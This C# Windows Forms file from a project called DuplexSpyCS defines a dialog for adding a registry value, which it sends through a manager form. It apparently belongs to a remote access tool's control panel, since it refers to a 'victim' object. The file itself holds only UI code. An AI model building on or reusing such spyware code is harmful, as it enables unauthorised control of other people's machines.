using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmRegValAdd : Form
    {
        public frmManager f_mgr;
        public clsVictim v;

        public string currentPath;

        public frmRegValAdd()
        {
            InitializeComponent();
        }

        void setup()
        {
            comboBox1.SelectedIndex = 0;
            textBox1.Text = clsTools.GenerateFileName();
        }

        private void frmRegValAdd_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string valName = textBox1.Text;
            string valKind = comboBox1.Text;

            new Thread(() => f_mgr.Reg_ReqAddValue(currentPath, valName, valKind)).Start();
        }
    }
}
